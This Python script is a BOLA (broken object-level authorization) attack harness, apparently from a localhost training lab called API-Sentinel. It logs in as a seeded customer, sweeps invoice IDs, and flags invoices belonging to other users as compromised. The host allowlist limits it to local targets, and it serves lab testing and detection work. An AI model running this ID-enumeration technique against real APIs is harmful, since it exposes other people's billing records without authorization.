"""Local-only BOLA attack harness for the API-Sentinel training lab."""

import argparse
import os
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

import requests

PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from scripts.attacks.attack_logger import AttackLogger
from scripts.traffic.customer_pool import build_customer_pool

DEFAULT_BASE_URL = "http://127.0.0.1"
ALLOWED_HOSTS = {"127.0.0.1", "localhost", "::1"}


def validate_base_url(base_url):
    """Prevent the attack harness from targeting arbitrary remote hosts."""
    parsed = urlparse(base_url)

    if (
        parsed.scheme != "http"
        or parsed.hostname not in ALLOWED_HOSTS
        or parsed.port is not None
        or parsed.username is not None
        or parsed.password is not None
        or parsed.path not in ("", "/")
        or parsed.query
        or parsed.fragment
    ):
        raise ValueError(
            "Only local HTTP targets are allowed, e.g. http://127.0.0.1"
        )

    return base_url.rstrip("/")


def validate_billing_override_url(url):
    """Allow only the local Day 21 wrapper as a billing override."""
    if not url:
        return None
    parsed = urlparse(url)
    if (
        parsed.scheme != "http"
        or parsed.hostname not in ALLOWED_HOSTS
        or parsed.port != 8005
        or parsed.username is not None
        or parsed.password is not None
        or parsed.path not in ("", "/")
        or parsed.query
        or parsed.fragment
    ):
        raise ValueError(
            "BILLING_OVERRIDE_URL must target the local Day 21 wrapper, "
            "e.g. http://127.0.0.1:8005"
        )
    return url.rstrip("/")


def classify_invoice_response(status_code, body, attacker_id):
    """Classify the observed result using the returned object's ownership."""
    if status_code == 401:
        return "AUTH_FAILED"

    if status_code in (403, 404):
        return "BLOCKED"

    if status_code != 200 or not isinstance(body, dict):
        return "ERROR"

    owner_id = body.get("owner_id")

    if isinstance(owner_id, bool) or not isinstance(owner_id, int):
        return "ERROR"

    if owner_id == attacker_id:
        return "OWN_DATA"

    return "BOLA_SUCCESS"


class BOLAAttack:
    def __init__(
        self,
        base_url=DEFAULT_BASE_URL,
        output_dir=None,
        timeout=5,
        delay=0.2,
        session=None,
        logger=None,
    ):
        self.base_url = validate_base_url(base_url)
        self.billing_override_url = validate_billing_override_url(
            os.environ.get("BILLING_OVERRIDE_URL")
        )
        self.timeout = timeout
        self.delay = delay
        self.session = session or requests.Session()
        self.logger = logger or AttackLogger(
            "bola_attack", output_dir=output_dir
        )

    def _url(self, port, path):
        if (
            port == 5004
            and path.startswith("/api/v2/billing/")
            and self.billing_override_url
        ):
            return f"{self.billing_override_url}{path}"
        return f"{self.base_url}:{port}{path}"

    def login(self, customer):
        """Return the authenticated user ID and Bearer headers."""
        response = self.session.post(
            self._url(5001, "/api/v2/auth/login"),
            json={
                "username": customer.username,
                "password": customer.password,
            },
            timeout=self.timeout,
        )

        if response.status_code != 200:
            self.logger.log(
                label="AUTH_FAILED",
                traffic_label="ATTACK",
                route="/api/v2/auth/login",
                username=customer.username,
                http_status=response.status_code,
            )
            raise RuntimeError(
                f"Login failed for {customer.username}: "
                f"HTTP {response.status_code}"
            )

        try:
            body = response.json()
            user_id = body["user_id"]
            token = body["token"]
        except (ValueError, KeyError, TypeError) as exc:
            raise RuntimeError("Login response is missing user_id or token") from exc

        if isinstance(user_id, bool) or not isinstance(user_id, int):
            raise RuntimeError("Login response contains an invalid user_id")

        if not isinstance(token, str) or not token:
            raise RuntimeError("Login response contains an invalid token")

        return user_id, {"Authorization": f"Bearer {token}"}

    def _record_request(
        self,
        *,
        port,
        path,
        headers,
        attacker_id,
        mode,
        invoice_id=None,
        repeat_index=1,
        route=None,
    ):
        started = time.monotonic()
        status_code = None
        body = None
        error = None

        try:
            request_headers = dict(headers)
            if (
                port == 5004
                and path.startswith("/api/v2/billing/invoices/")
                and self.billing_override_url
            ):
                request_headers["X-Day21-Traffic-Class"] = "attack"
            response = self.session.get(
                self._url(port, path),
                headers=request_headers,
                timeout=self.timeout,
            )
            status_code = response.status_code

            try:
                body = response.json()
            except ValueError:
                body = None

            if port == 5004:
                label = classify_invoice_response(
                    status_code, body, attacker_id
                )
            elif status_code == 401:
                label = "AUTH_FAILED"
            elif status_code in (403, 404):
                label = "BLOCKED"
            else:
                label = "ERROR"

        except requests.RequestException as exc:
            label = "ERROR"
            error = type(exc).__name__

        duration_ms = round((time.monotonic() - started) * 1000, 3)
        owner_id = body.get("owner_id") if isinstance(body, dict) else None

        record = {
            "label": label,
            "verdict": label,
            "traffic_label": "ATTACK",
            "mode": mode,
            "route": route or path,
            "attacker_id": attacker_id,
            "invoice_id": invoice_id,
            "actual_owner_id": owner_id,
            "owner_id": owner_id,
            "http_status": status_code,
            "status": status_code,
            "duration_ms": duration_ms,
            "repeat_index": repeat_index,
        }

        if error:
            record["error"] = error

        if isinstance(owner_id, int) and not isinstance(owner_id, bool):
            record["cross_user_access"] = owner_id != attacker_id

        self.logger.log(**record)

        return record

    def test_invoice(self, attacker_id, headers, invoice_id, mode, repeat_index=1):
        return self._record_request(
            port=5004,
            path=f"/api/v2/billing/invoices/{invoice_id}",
            headers=headers,
            attacker_id=attacker_id,
            mode=mode,
            invoice_id=invoice_id,
            repeat_index=repeat_index,
        )

    def run_targeted(self, attacker_id, headers, invoice_id, repeats):
        results = []

        for repeat_index in range(1, repeats + 1):
            results.append(
                self.test_invoice(
                    attacker_id,
                    headers,
                    invoice_id,
                    mode="targeted",
                    repeat_index=repeat_index,
                )
            )
            if repeat_index < repeats:
                time.sleep(self.delay)

        return results

    def run_sweep(self, attacker_id, headers, start_id, end_id):
        results = []

        for invoice_id in range(start_id, end_id + 1):
            results.append(
                self.test_invoice(
                    attacker_id,
                    headers,
                    invoice_id,
                    mode="sweep",
                )
            )
            if invoice_id < end_id:
                time.sleep(self.delay)

        return results

    def test_order_control(self, attacker_id, attacker_headers, other_customer):
        """Confirm another user's order remains inaccessible."""
        other_id, other_headers = self.login(other_customer)

        if other_id == attacker_id:
            raise RuntimeError("Control customers resolved to the same user ID")

        response = self.session.get(
            self._url(5003, "/api/v2/orders"),
            headers=other_headers,
            timeout=self.timeout,
        )
        response.raise_for_status()

        orders = response.json().get("orders", [])
        if not orders:
            raise RuntimeError("Control customer has no orders")

        order_id = orders[0].get("id")
        if not isinstance(order_id, int):
            raise RuntimeError("Control order has an invalid ID")

        return self._record_request(
            port=5003,
            path=f"/api/v2/orders/{order_id}",
            headers=attacker_headers,
            attacker_id=attacker_id,
            mode="secure_order_control",
            route=f"/api/v2/orders/{order_id}",
        )

    def close(self):
        self.logger.close()


def parse_args():
    parser = argparse.ArgumentParser(
        description="Run local API-Sentinel BOLA tests."
    )
    parser.add_argument(
        "--mode",
        choices=("targeted", "sweep"),
        default="targeted",
    )
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    parser.add_argument("--username", help="Seeded customer username")
    parser.add_argument("--invoice-id", type=int, default=1)
    parser.add_argument("--repeats", type=int, default=1)
    parser.add_argument("--start-id", type=int, default=1)
    parser.add_argument("--end-id", type=int, default=160)
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument("--timeout", type=float, default=5)
    parser.add_argument("--output-dir")
    parser.add_argument(
        "--order-control",
        action="store_true",
        help="Also test cross-user access to a second customer's order",
    )
    parser.add_argument(
        "--nonexistent-invoice-id",
        type=int,
        help="Optionally test an invoice ID expected not to exist",
    )
    args = parser.parse_args()

    if args.invoice_id < 1 or args.start_id < 1 or args.end_id < args.start_id:
        parser.error("Invoice IDs must be positive and end ID >= start ID")
    if args.repeats < 1:
        parser.error("--repeats must be at least 1")
    if args.delay < 0 or args.timeout <= 0:
        parser.error("--delay must be >= 0 and --timeout must be > 0")
    if (
        args.nonexistent_invoice_id is not None
        and args.nonexistent_invoice_id < 1
    ):
        parser.error("--nonexistent-invoice-id must be positive")

    try:
        validate_base_url(args.base_url)
    except ValueError as exc:
        parser.error(str(exc))

    return args


def print_summary(results, mode):
    """Print verdict counts and cross-user invoice findings for sweeps."""
    counts = {}
    for result in results:
        label = result["label"]
        counts[label] = counts.get(label, 0) + 1

    print(f"Requests tested: {len(results)}")
    for label, count in sorted(counts.items()):
        print(f"  {label}: {count}")

    if mode == "sweep":
        compromised = [
            result for result in results
            if result.get("label") == "BOLA_SUCCESS"
            and result.get("cross_user_access") is True
        ]
        print(
            "Invoices compromised (belonging to OTHER users): "
            f"{len(compromised)}"
        )
        if compromised:
            print("Sample compromised invoices:")
            for result in compromised[:10]:
                print(
                    f"  Invoice {result['invoice_id']} "
                    f"(owner ID {result['actual_owner_id']})"
                )


def main():
    args = parse_args()
    customers = build_customer_pool()

    if len(customers) < 2:
        raise RuntimeError("At least two seeded customers are required")

    attacker = next(
        (c for c in customers if c.username == args.username),
        None,
    ) if args.username else customers[0]

    if attacker is None:
        raise RuntimeError(f"Seeded customer not found: {args.username}")

    other_customer = next(
        (c for c in customers if c.username != attacker.username), None
    )

    attack = BOLAAttack(
        base_url=args.base_url,
        output_dir=args.output_dir,
        timeout=args.timeout,
        delay=args.delay,
    )

    try:
        attacker_id, headers = attack.login(attacker)
        print(f"Authenticated attacker: {attacker.username} (ID {attacker_id})")

        if args.mode == "targeted":
            results = attack.run_targeted(
                attacker_id, headers, args.invoice_id, args.repeats
            )
        else:
            results = attack.run_sweep(
                attacker_id, headers, args.start_id, args.end_id
            )

        if args.nonexistent_invoice_id is not None:
            results.append(
                attack.test_invoice(
                    attacker_id,
                    headers,
                    args.nonexistent_invoice_id,
                    mode="nonexistent_control",
                )
            )

        if args.order_control:
            results.append(
                attack.test_order_control(
                    attacker_id, headers, other_customer
                )
            )

        print_summary(results, args.mode)
        print(f"Evidence: {attack.logger.path}")

    finally:
        attack.close()


if __name__ == "__main__":
    main()
